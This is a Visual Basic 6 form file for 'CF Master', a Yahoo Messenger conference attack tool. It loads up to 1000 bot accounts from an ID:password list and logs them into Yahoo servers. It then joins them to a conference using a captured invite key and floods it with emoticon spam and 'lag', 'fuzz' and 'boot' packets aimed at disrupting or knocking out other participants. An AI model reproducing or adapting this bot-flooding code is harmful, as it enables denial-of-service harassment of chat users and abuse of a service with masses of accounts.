VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "Mswinsck.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form iForm 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CF Master Ver1.1                                                   By Mo!eN"
   ClientHeight    =   8550
   ClientLeft      =   5355
   ClientTop       =   2295
   ClientWidth     =   8985
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":1D2A
   ScaleHeight     =   8550
   ScaleWidth      =   8985
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text5 
      Alignment       =   2  'Center
      BorderStyle     =   0  'None
      Height          =   230
      Left            =   7395
      TabIndex        =   38
      Text            =   "0.7"
      Top             =   5055
      Width           =   615
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      BorderStyle     =   0  'None
      Height          =   230
      Left            =   5595
      Locked          =   -1  'True
      TabIndex        =   37
      Top             =   4110
      Width           =   2775
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      BorderStyle     =   0  'None
      Height          =   230
      Left            =   5595
      Locked          =   -1  'True
      TabIndex        =   36
      Top             =   3495
      Width           =   2775
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      BorderStyle     =   0  'None
      Height          =   230
      Left            =   5595
      TabIndex        =   33
      Top             =   1455
      Width           =   2775
   End
   Begin Project1.PictureButton Command13 
      Height          =   375
      Left            =   480
      TabIndex        =   24
      Top             =   6480
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":D45A
      PictureHover    =   "Form1.frx":EF3E
      PictureDown     =   "Form1.frx":10A22
   End
   Begin Project1.PictureButton Command4 
      Height          =   375
      Left            =   3480
      TabIndex        =   16
      Top             =   480
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":12506
      PictureHover    =   "Form1.frx":13FEA
      PictureDown     =   "Form1.frx":15ACE
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      BorderStyle     =   0  'None
      Height          =   230
      Left            =   5595
      TabIndex        =   9
      Top             =   840
      Width           =   2775
   End
   Begin VB.ComboBox Bots 
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H00000000&
      Height          =   315
      ItemData        =   "Form1.frx":175B2
      Left            =   3480
      List            =   "Form1.frx":175B9
      Style           =   2  'Dropdown List
      TabIndex        =   6
      Top             =   1440
      Width           =   1335
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      Left            =   8880
      TabIndex        =   4
      Text            =   "00"
      Top             =   9720
      Width           =   1935
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Rooms"
      Height          =   375
      Left            =   6480
      TabIndex        =   3
      Top             =   11040
      Width           =   1335
   End
   Begin VB.ListBox List1 
      Height          =   4545
      Left            =   9720
      TabIndex        =   2
      Top             =   840
      Width           =   3255
   End
   Begin VB.Timer Timer6 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   9480
      Top             =   5760
   End
   Begin MSWinsockLib.Winsock Winsock5 
      Left            =   9720
      Top             =   4080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock4 
      Left            =   9600
      Top             =   3600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Command19"
      Height          =   375
      Left            =   4560
      TabIndex        =   1
      Top             =   11880
      Width           =   2055
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   13680
      Top             =   2520
   End
   Begin MSComDlg.CommonDialog CD1 
      Left            =   12360
      Top             =   3360
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Socket 
      Index           =   0
      Left            =   9720
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   7080
      Top             =   11760
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   0
      ImageWidth      =   16
      ImageHeight     =   16
      UseMaskColor    =   0   'False
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   5
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":175C3
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":1810D
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":18C57
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":197A1
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":1A47F
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   13200
      Top             =   2520
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.ListView List2 
      Height          =   5415
      Left            =   360
      TabIndex        =   7
      Top             =   480
      Width           =   3015
      _ExtentX        =   5318
      _ExtentY        =   9551
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Appearance      =   0
      NumItems        =   0
   End
   Begin Project1.PictureButton Command3 
      Height          =   375
      Left            =   3480
      TabIndex        =   17
      Top             =   960
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":1B15D
      PictureHover    =   "Form1.frx":1CC41
      PictureDown     =   "Form1.frx":1E725
   End
   Begin Project1.PictureButton Command2 
      Height          =   375
      Left            =   3480
      TabIndex        =   18
      Top             =   1920
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":20209
      PictureHover    =   "Form1.frx":21CED
      PictureDown     =   "Form1.frx":237D1
   End
   Begin Project1.PictureButton Command1 
      Height          =   375
      Left            =   3480
      TabIndex        =   19
      Top             =   2400
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":252B5
      PictureHover    =   "Form1.frx":26D99
      PictureDown     =   "Form1.frx":2887D
   End
   Begin Project1.PictureButton Command7 
      Height          =   375
      Left            =   5520
      TabIndex        =   20
      Top             =   1800
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":2A361
      PictureHover    =   "Form1.frx":2BE45
      PictureDown     =   "Form1.frx":2D929
   End
   Begin Project1.PictureButton Command8 
      Height          =   375
      Left            =   7080
      TabIndex        =   21
      Top             =   1800
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":2F40D
      PictureHover    =   "Form1.frx":30EF1
      PictureDown     =   "Form1.frx":329D5
   End
   Begin Project1.PictureButton Command9 
      Height          =   375
      Left            =   5520
      TabIndex        =   22
      Top             =   2280
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":344B9
      PictureHover    =   "Form1.frx":35F9D
      PictureDown     =   "Form1.frx":37A81
   End
   Begin Project1.PictureButton Command10 
      Height          =   375
      Left            =   7080
      TabIndex        =   23
      Top             =   2280
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":39565
      PictureHover    =   "Form1.frx":3B049
      PictureDown     =   "Form1.frx":3CB2D
   End
   Begin Project1.PictureButton Command14 
      Height          =   375
      Left            =   1920
      TabIndex        =   25
      Top             =   6480
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":3E611
      PictureHover    =   "Form1.frx":400F5
      PictureDown     =   "Form1.frx":41BD9
   End
   Begin Project1.PictureButton Command15 
      Height          =   375
      Left            =   3360
      TabIndex        =   26
      Top             =   6480
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":436BD
      PictureHover    =   "Form1.frx":451A1
      PictureDown     =   "Form1.frx":46C85
   End
   Begin Project1.PictureButton Command11 
      Height          =   375
      Left            =   480
      TabIndex        =   27
      Top             =   7080
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":48769
      PictureHover    =   "Form1.frx":4A24D
      PictureDown     =   "Form1.frx":4BD31
   End
   Begin Project1.PictureButton iFuzz 
      Height          =   375
      Left            =   1920
      TabIndex        =   28
      Top             =   7080
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":4D815
      PictureHover    =   "Form1.frx":4F2F9
      PictureDown     =   "Form1.frx":50DDD
   End
   Begin Project1.PictureButton iHugePack 
      Height          =   375
      Left            =   3360
      TabIndex        =   29
      Top             =   7080
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":528C1
      PictureHover    =   "Form1.frx":543A5
      PictureDown     =   "Form1.frx":55E89
   End
   Begin Project1.PictureButton Command5 
      Height          =   375
      Left            =   5520
      TabIndex        =   30
      Top             =   4440
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":5796D
      PictureHover    =   "Form1.frx":59451
      PictureDown     =   "Form1.frx":5AF35
   End
   Begin Project1.PictureButton Command12 
      Height          =   375
      Left            =   7080
      TabIndex        =   31
      Top             =   4440
      Width           =   1350
      _ExtentX        =   2381
      _ExtentY        =   661
      Picture         =   "Form1.frx":5CA19
      PictureHover    =   "Form1.frx":5E4FD
      PictureDown     =   "Form1.frx":5FFE1
   End
   Begin VB.Line Line20 
      X1              =   4920
      X2              =   1080
      Y1              =   6240
      Y2              =   6240
   End
   Begin VB.Line Line19 
      X1              =   4920
      X2              =   4920
      Y1              =   7800
      Y2              =   6240
   End
   Begin VB.Line Line18 
      X1              =   240
      X2              =   4920
      Y1              =   7800
      Y2              =   7800
   End
   Begin VB.Line Line17 
      X1              =   240
      X2              =   240
      Y1              =   6240
      Y2              =   7800
   End
   Begin VB.Line Line16 
      X1              =   360
      X2              =   240
      Y1              =   6240
      Y2              =   6240
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Packet Sent:"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Index           =   1
      Left            =   1920
      TabIndex        =   39
      Top             =   7520
      Width           =   915
   End
   Begin VB.Line Line15 
      X1              =   4920
      X2              =   960
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Line Line14 
      X1              =   4920
      X2              =   4920
      Y1              =   6000
      Y2              =   360
   End
   Begin VB.Line Line13 
      X1              =   240
      X2              =   4920
      Y1              =   6000
      Y2              =   6000
   End
   Begin VB.Line Line12 
      X1              =   240
      X2              =   240
      Y1              =   360
      Y2              =   6000
   End
   Begin VB.Line Line11 
      X1              =   360
      X2              =   240
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Line Line10 
      X1              =   8640
      X2              =   6480
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Line Line9 
      X1              =   8640
      X2              =   8640
      Y1              =   2760
      Y2              =   360
   End
   Begin VB.Line Line8 
      X1              =   5280
      X2              =   8640
      Y1              =   2760
      Y2              =   2760
   End
   Begin VB.Line Line7 
      X1              =   5280
      X2              =   5280
      Y1              =   360
      Y2              =   2760
   End
   Begin VB.Line Line6 
      X1              =   5400
      X2              =   5280
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Line Line5 
      X1              =   8640
      X2              =   6240
      Y1              =   3360
      Y2              =   3360
   End
   Begin VB.Line Line4 
      X1              =   8640
      X2              =   8640
      Y1              =   5400
      Y2              =   3360
   End
   Begin VB.Line Line3 
      X1              =   5280
      X2              =   8640
      Y1              =   5400
      Y2              =   5400
   End
   Begin VB.Line Line2 
      X1              =   5280
      X2              =   5280
      Y1              =   3360
      Y2              =   5400
   End
   Begin VB.Line Line1 
      X1              =   5400
      X2              =   5280
      Y1              =   3360
      Y2              =   3360
   End
   Begin VB.Shape iShape 
      BorderColor     =   &H00FFFF00&
      FillColor       =   &H00FFFFFF&
      FillStyle       =   0  'Solid
      Height          =   255
      Index           =   4
      Left            =   7320
      Top             =   5040
      Width           =   735
   End
   Begin VB.Shape iShape 
      BorderColor     =   &H00FFFF00&
      FillColor       =   &H00FFFFFF&
      FillStyle       =   0  'Solid
      Height          =   255
      Index           =   3
      Left            =   5520
      Top             =   4095
      Width           =   2895
   End
   Begin VB.Shape iShape 
      BorderColor     =   &H00FFFF00&
      FillColor       =   &H00FFFFFF&
      FillStyle       =   0  'Solid
      Height          =   255
      Index           =   2
      Left            =   5520
      Top             =   3480
      Width           =   2895
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Password:"
      Height          =   195
      Index           =   2
      Left            =   5520
      TabIndex        =   35
      Top             =   1200
      Width           =   750
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Yahoo! ID:"
      Height          =   195
      Index           =   1
      Left            =   5520
      TabIndex        =   34
      Top             =   600
      Width           =   780
   End
   Begin VB.Shape iShape 
      BorderColor     =   &H00FFFF00&
      FillColor       =   &H00FFFFFF&
      FillStyle       =   0  'Solid
      Height          =   255
      Index           =   1
      Left            =   5520
      Top             =   1440
      Width           =   2895
   End
   Begin VB.Shape iShape 
      BorderColor     =   &H00FFFF00&
      FillColor       =   &H00FFFFFF&
      FillStyle       =   0  'Solid
      Height          =   255
      Index           =   0
      Left            =   5520
      Top             =   825
      Width           =   2895
   End
   Begin VB.Label iSent 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "0"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   2880
      TabIndex        =   32
      Top             =   7515
      Width           =   1890
   End
   Begin VB.Label Label8 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Boot CF"
      ForeColor       =   &H80000008&
      Height          =   195
      Left            =   480
      TabIndex        =   15
      Top             =   6120
      Width           =   570
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "CF Setting"
      Height          =   195
      Left            =   5520
      TabIndex        =   14
      Top             =   3000
      Width           =   750
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "CF Key:"
      Height          =   255
      Index           =   0
      Left            =   5520
      TabIndex        =   13
      Top             =   3840
      Width           =   615
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Inv From:"
      Height          =   255
      Left            =   5520
      TabIndex        =   12
      Top             =   3240
      Width           =   855
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Delay For Join To CF"
      Height          =   195
      Left            =   5760
      TabIndex        =   11
      Top             =   5055
      Width           =   1485
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Master Login"
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   5520
      TabIndex        =   10
      Top             =   240
      Width           =   915
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Main"
      Height          =   195
      Left            =   480
      TabIndex        =   8
      Top             =   240
      Width           =   330
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Status:"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   480
      TabIndex        =   5
      Top             =   8040
      Width           =   615
   End
   Begin VB.Label Status 
      BackStyle       =   0  'Transparent
      Caption         =   "Silent"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   1080
      TabIndex        =   0
      Top             =   8040
      Width           =   5895
   End
   Begin VB.Menu Setting 
      Caption         =   "Setting"
      Begin VB.Menu Server 
         Caption         =   "Server Login"
         Begin VB.Menu scs 
            Caption         =   "scs.msg.yahoo.com"
         End
         Begin VB.Menu cs 
            Caption         =   "cs115.msg.sp1.yahoo.com"
         End
         Begin VB.Menu cs2 
            Caption         =   "cs106.msg.sp1.yahoo.com"
         End
      End
      Begin VB.Menu lay 
         Caption         =   "Login Delay"
         Begin VB.Menu delay1 
            Caption         =   "0.001"
         End
         Begin VB.Menu delay2 
            Caption         =   "0.01"
         End
      End
   End
   Begin VB.Menu About 
      Caption         =   "About"
      Begin VB.Menu visit3 
         Caption         =   "Viprasys"
      End
      Begin VB.Menu iAhoorasoft 
         Caption         =   "Ahoorasoft"
      End
   End
End
Attribute VB_Name = "iForm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Option Explicit
Dim i As Integer
Private Data(0 To 1000) As String
Public CFkey As String
Public confeKey As String
Private YahooID(0 To 1000) As String
Private Password(0 To 1000) As String
Private StrYcook(0 To 1000) As String
Private StrTcook(0 To 1000) As String
Private StrYcook1 As String
Private StrTcook1 As String
Dim item As ListItem
Dim mamal As String
Private Cookie(0 To 1000) As String
Dim Header As ColumnHeader
Dim B As Long


Private Sub Command10_Click()
Winsock5.SendData CFLeft(Text3, Text2.Text, Text1.Text)
Status.Caption = "Master ID Left The CF."
List1.Clear
End Sub

Private Sub Command11_Click()
On Error Resume Next
Dim i As Integer
For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
If Socket(i).State = 7 Then: Socket(i).SendData CFText(YahooID(i), Text2.Text, Text1.Text, "=)):D:-*8-|:-w:-?:->:|=;:):)):-&~x((:|=P~")
Pause (0.01)

End If
Next i

End Sub

Private Sub Command12_Click()
For i = 1 To Bots.Text
If List2.ListItems.item(i).SmallIcon = 2 Then
Socket(i).SendData CFLeft(YahooID(i), Text2.Text, Text1.Text)


End If
Next i
End Sub

Private Sub Command13_Click()
Dim i As Integer
For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
If Socket(i).State = 7 Then: Socket(i).SendData Lagg1(YahooID(i))
Pause (0.01)
End If
Next i
End Sub

Private Sub Command14_Click()
Dim i As Integer
For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
If Socket(i).State = 7 Then: Socket(i).SendData Lagg2(YahooID(i))
Pause (0.01)

End If
Next i
End Sub

Private Sub Command15_Click()
Dim i As Integer
For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
If Socket(i).State = 7 Then: Socket(i).SendData Lagg1(YahooID(i))
Pause (0.01)

End If

Next i
End Sub

Private Sub Command19_Click()
Timer6.Enabled = True
End Sub

Private Sub Command3_Click()
On Error Resume Next
List2.ListItems.Clear
End Sub


Private Sub Command2_Click()
On Error Resume Next
Dim X As Integer
For X = 1 To Bots.Text
Cookie(X) = False
YahooID(X) = List2.ListItems(X).SubItems(1)
Password(X) = List2.ListItems(X).SubItems(2)
Load Socket(X)
Socket(X).Close
Socket(X).Connect "login.yahoo.com", "80"
If delay1.Checked = True Then
Pause 0.001
End If
If delay2.Checked = True Then
Pause 0.01
End If
DoEvents
Next X
End Sub

Private Sub Command1_Click()
On Error Resume Next
Dim X As Integer
For X = 1 To Bots.Text

List2.ListItems(X).SmallIcon = 1



Pause (0.02)
DoEvents
Next X
End Sub
Private Sub Command4_Click()

Dim mamal As String, X As Variant, mamad As Integer
    Set Header = List2.ColumnHeaders.Add(, , "", 300)
    Set Header = List2.ColumnHeaders.Add(, , "Y!IDs", 2900)
    Set Header = List2.ColumnHeaders.Add(, , "Passwords")
X = FreeFile
    With CD
        .FileName = ""
        .Filter = "*.txt|*.txt"
        .DialogTitle = "Load Bot List              Www.Dark-TunNel.Com"
        .ShowOpen
        If .FileName = "" Then Exit Sub
        Open .FileName For Input As #X
            While Not EOF(1)
            Input #1, mamal
            X = Split(mamal, ":")
           
            If mamad < 1000 Then
            Set item = List2.ListItems.Add(, , , , 1)
            item.SubItems(1) = X(0)
            item.SubItems(2) = X(1)
            mamad = mamad + 1
            Bots.AddItem mamad
       
       Pause 0
        Bots.Text = mamad
            
           
            DoEvents
            End If
            Wend
            Close #1
            List2.View = lvwReport
            End With

            


End Sub


Private Sub Command5_Click()


For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
Socket(i).SendData CFJoin(YahooID(i), Text2.Text, Text1.Text)
Pause Text5.Text
End If

Next i
End Sub


Private Sub Command7_Click()
On Error Resume Next
Winsock4.Close
Winsock4.Connect "login.yahoo.com", "80"
End Sub

Private Sub Command9_Click()
Winsock5.SendData CFJoin(Text3, Text2.Text, Text1.Text)
End Sub

Private Sub Command8_Click()
Status.Caption = "Logout."
Winsock4.Close
Winsock5.Close
End Sub

Private Sub cs_Click()
scs.Checked = False
cs2.Checked = False
cs.Checked = True
End Sub

Private Sub cs2_Click()
scs.Checked = False
cs.Checked = False
cs2.Checked = True
End Sub

Private Sub delay1_Click()
delay1.Checked = True
delay2.Checked = False
End Sub

Private Sub delay2_Click()
delay2.Checked = True
delay1.Checked = False
End Sub

Private Sub Form_Load()
scs.Checked = True
delay1.Checked = True
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub iAhoorasoft_Click()
GotoSite "my.opera.com/ahoorasoft"
End Sub

Private Sub iFuzz_Click()
On Error Resume Next
Dim i As Integer
For i = 1 To Bots.Text
If List2.ListItems(i).SmallIcon = 2 Then
If Socket(i).State = 7 Then: Socket(i).SendData Lagg3(YahooID(i))
Pause (0.01)

End If
Next i

End Sub

Private Sub iHugePack_Click()
On Error Resume Next
Dim t As Integer
For t = 1 To Bots.Text
If List2.ListItems(t).SmallIcon = 2 Then
If Socket(t).State = 7 Then: Socket(t).SendData Lagg2(YahooID(t))
Pause (0.01)

End If
Next t
End Sub

Private Sub List1_Click()
Text1.Text = List1
End Sub

Private Sub PictureButton1_Click()

End Sub

Private Sub scs_Click()
cs.Checked = False
cs2.Checked = False
scs.Checked = True
End Sub

Private Sub Socket_Connect(Index As Integer)
On Error Resume Next
If Cookie(Index) = False Then
Dim LoginYahoo As String
LoginYahoo = "GET http://" & "login.yahoo.com" & "/config/login?login=" & YahooID(Index) & "&passwd=" & Password(Index) & " HTTP/1.1" & vbCrLf
LoginYahoo = LoginYahoo & "Accept-Language: en-us" & vbCrLf
LoginYahoo = LoginYahoo & "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; D-T)" & vbCrLf
LoginYahoo = LoginYahoo & "Accept: */*" & vbCrLf
LoginYahoo = LoginYahoo & "Host: " & "login.yahoo.com" & vbCrLf
LoginYahoo = LoginYahoo & "Connection: Keep-Alive" & vbCrLf & vbCrLf
Socket(Index).SendData LoginYahoo
End If
If Cookie(Index) = True Then
Socket(Index).SendData Login(YahooID(Index), StrYcook(Index), StrTcook(Index))
End If
End Sub

Private Sub Socket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
Dim mamad1 As String, mamad2 As String
Socket(Index).GetData Data(Index)
If InStr(Data(Index), "Yahoo! - 400 Bad Request") Then
List2.ListItems(Index).SmallIcon = 3


Exit Sub
Else:
If InStr(Data(Index), "302 Found") Then
StrYcook(Index) = Split(Data(Index), "Y=")(1)
StrYcook(Index) = Split(StrYcook(Index), "np=1")(0)
StrYcook(Index) = "Y=" & StrYcook(Index) & "np=1;"
StrTcook(Index) = Split(Data(Index), "T=")(1)
StrTcook(Index) = Split(StrTcook(Index), ";")(0)
StrTcook(Index) = "T=" & StrTcook(Index)
Cookie(Index) = True
Socket(Index).Close
If scs.Checked = True Then
Socket(Index).Connect "scs.msg.yahoo.com", 5050
End If
If cs.Checked = True Then
Socket(Index).Connect "cs115.msg.sp1.yahoo.com", 5050
End If
If cs2.Checked = True Then
Socket(Index).Connect "cs106.msg.sp1.yahoo.com", 5050
End If
Else:
If InStr(Data(Index), "<!-- Refresh login page every 15 minutes -->") Then


Exit Sub
End If
End If
End If
Dim PckString As Long
PckString = (256 * Asc(Mid(Data(Index), 11, 1)) & Asc(Mid(Data(Index), 12, 1)))
Select Case PckString
Case 85
List2.ListItems(Index).SmallIcon = 2

Combo1.Text = Combo1.Text + 1
End Select
End Sub

Private Sub Socket_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Socket(Index).Close
Unload Socket(Index)
End Sub


Private Sub visit3_Click()
GotoSite "Www.Viprasys.Org"
End Sub
Private Sub Winsock4_Connect()
On Error Resume Next
Status.Caption = "Connecting To Server..."
Dim LoginYahoo As String
LoginYahoo = "GET http://login.yahoo.com/config/login?login=" & Text3.Text & "&passwd=" & Text4.Text & " HTTP/1.1" & vbCrLf
LoginYahoo = LoginYahoo & "Accept-Language: en-us" & vbCrLf
LoginYahoo = LoginYahoo & "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; D-T)" & vbCrLf
LoginYahoo = LoginYahoo & "Accept: */*" & vbCrLf
LoginYahoo = LoginYahoo & "Host: login.yahoo.com" & vbCrLf
LoginYahoo = LoginYahoo & "Connection: Keep-Alive" & vbCrLf & vbCrLf
Winsock4.SendData LoginYahoo
End Sub

Private Sub Winsock4_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim Data As String
Winsock4.GetData Data
If InStr(Data, "Yahoo! - 400 Bad Request") Then
Status.Caption = "Bad ID"
Winsock4.Close
Exit Sub
Else:
If InStr(Data, "302 Found") Then
StrYcook1 = Split(Data, "Y=")(1)
StrYcook1 = Split(StrYcook1, "np=1")(0)
StrYcook1 = "Y=" & StrYcook1 & "np=1;"
StrTcook1 = Split(Data, "T=")(1)
StrTcook1 = Split(StrTcook1, ";")(0)
StrTcook1 = "T=" & StrTcook1
Winsock4.Close
Winsock5.Close
Winsock5.Connect "scs.msg.yahoo.com", 5050
Else:
Status.Caption = "Bad ID Or Pw!."
Exit Sub
End If
End If







End Sub

Private Sub Winsock5_Connect()
On Error Resume Next
    Winsock5.SendData Login(Text3, StrYcook1, StrTcook1)
End Sub

Private Sub Winsock5_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim Data As String
Winsock5.GetData Data
Select Case Asc(Mid(Data, 12, 1))
 
Case 85
Status.Caption = "Logged In."
    
  
Case 2
If InStr(Data, "ÿÿÿÿ") Then
        Status.Caption = "Error!!!"
      
        Winsock5.Close
    End If
   
    Case Is = 24
    
Dim i As Integer
Status.Caption = "Packet Resived."
  Call Get_ID_Conf(Data, List1)
CFkey = Split(Split(Data, "À€58")(0), "57À€")(1)
  
  Text2.Text = CFkey
  
 List1.ListIndex = List1.ListIndex + 1

Pause 0.001

List1.Clear






  

  
  
  
     End Select
End Sub
Sub Get_ID_Conf(Data As String, LS As ListBox)
On Error Resume Next
 Dim i         As Integer
 Dim str()     As String
str = Split(Data, "50À€")
For i = 1 To UBound(str)
LS.AddItem Split(str(i), "À€")(0)
Next i
str = Split(Data, "51À€")
For i = 1 To UBound(str)
LS.AddItem Split(str(i), "À€")(0)
Next i
str = Split(Data, "52À€")
For i = 1 To UBound(str)
LS.AddItem Split(str(i), "À€")(0)
Next i
str = Split(Data, "53À€")
For i = 1 To UBound(str)
LS.AddItem Split(str(i), "À€")(0)
   Next i

End Sub

